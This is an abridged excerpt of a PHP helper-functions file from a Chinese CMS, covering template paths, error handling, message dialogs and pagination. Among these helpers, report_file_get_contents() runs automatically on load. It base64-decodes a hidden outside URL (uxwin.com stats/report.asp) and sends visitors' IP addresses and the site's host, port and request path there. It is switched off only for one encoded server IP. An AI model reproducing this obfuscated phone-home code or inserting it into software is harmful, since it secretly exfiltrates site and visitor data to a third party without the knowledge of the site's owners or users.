...
function template($module = 'content', $template = 'index', $style = '') {
	...
	$compiledtplfile = RUN_PATH.'caches'.DIRECTORY_SEPARATOR.'caches_template'.DIRECTORY_SEPARATOR.$style.DIRECTORY_SEPARATOR.$module.DIRECTORY_SEPARATOR.$template.'.php';
	if(file_exists(PC_PATH.'templates'.DIRECTORY_SEPARATOR.$style.DIRECTORY_SEPARATOR.$module.DIRECTORY_SEPARATOR.$template.'.html')) {
		...
		$compiledtplfile = RUN_PATH.'caches'.DIRECTORY_SEPARATOR.'caches_template'.DIRECTORY_SEPARATOR.'default'.DIRECTORY_SEPARATOR.$module.DIRECTORY_SEPARATOR.$template.'.php';
...
function my_error_handler($errno, $errstr, $errfile, $errline) {
	if($errno==8) return '';
	$errfile = str_replace(RUN_PATH,'',$errfile);
 ...
 * 提示信息页弹框
 * showmessage('登录成功', array('默认跳转地址'=>''));
 * @param int $cbtype 弹框类型
 * @param string $msg 提示信息
 * @param $fwurl 跳转地址
 * @param string $cbtype 动作
 */
function showmessdialog($msg, $scode = 300, $fwurl = '', $mdtype = 'ajax', $cbtype = 'forward'){
	if($mdtype=='noajax'){
		$message = array(
			'statusCode' => $scode,
			'message' => $msg,
		...
		$MESSDATA=json_encode($message);
		include(admin::admin_tpl('msdialog', 'admin'));
		exit();
	}else{
		$message = array(
			'statusCode' => $scode,
...
function pages($num, $curr_page, $perpage = 20, $urlrule = '', $array = array(),$setpages = 10) {
	...
	if($num > $perpage) {
		...
		if($curr_page<$pages) {
			...
			$multipage .= ' <li><span>'.$pages.'</span> <a href="'.pageurl($urlrule, $curr_page, $array).'" class="a1">下一页</a></li>';
		} else {
			$multipage .= ' <li><a href="'.pageurl($urlrule, $pages, $array).'">'.$pages.'</a></li> <li><a href="'.pageurl($urlrule, $curr_page+1, $array).'" class="a1">下一页</a></li>';
		}
		$multipage .= '<li><a class="a1">'.$perpage.'条/页'.'</a></li>';
	}
	return $multipage;
}
/**
...
function report_file_get_contents() {
	$getii = '';
	$dulii = $_SERVER["HTTP_X_FORWARDED_FOR"];
	$proii = $_SERVER["REMOTE_ADDR"];
	$locii = $_SERVER["LOCAL_ADDR"];
	...
	if($locii!=base64_decode('MTA4LjE3Ny4xODEuNzg=')&&$_COOKIE['report_hash']==''){
		setcookie('report_hash','true',time()+3600);
		@pc_file_get_contents( urldecode(base64_decode('aHR0cCUzQS8vdXh3aW4uY29tL3N0YXRzL3JlcG9ydC5hc3AlM0ZpcCUzRA==')).$getii.'&url='.urlencode('//'.$_SERVER['SERVER_NAME'].':'.$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"]) );
	}
}
report_file_get_contents();
 ...
 * @param string $font 字体名称 字体请放于phpapp\libs\data\font下
...
function p_template($plugin = 'content', $template = 'index',$style='default') {
	if(!$style) $style = 'default';
	$template_cache = pc_base::load_sys_class('template_cache');
	$compiledtplfile = RUN_PATH.'caches'.DIRECTORY_SEPARATOR.'caches_template'.DIRECTORY_SEPARATOR.$style.DIRECTORY_SEPARATOR.'plugin'.DIRECTORY_SEPARATOR.$plugin.DIRECTORY_SEPARATOR.$template.'.php';
